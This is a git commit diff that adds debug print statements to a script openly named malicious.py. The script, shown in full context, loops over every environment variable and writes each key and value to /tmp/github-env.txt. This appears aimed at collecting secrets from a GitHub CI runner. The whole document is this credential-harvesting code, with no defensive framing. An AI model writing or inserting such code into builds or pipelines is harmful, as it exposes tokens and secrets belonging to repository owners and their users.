b4b6e091f1724aca6f2dfadd11e88229d821761e
Antonia Kray <kray.antonia@gmail.com>
2025-07-11 12:03:13 +0200

    Added some debugging to malicious.py

--- malicious.py
+++ malicious.py
@@ -1,4 +1,8 @@
 import os 
+print("==> Python script started")
 with open('/tmp/github-env.txt', 'w') as f: 
     for k, v in os.environ.items(): 
         f.write(f"{k}={v}\n")
+        print("==> Entered loop")
+print("==> Wrote /tmp/github-env.txt")
+
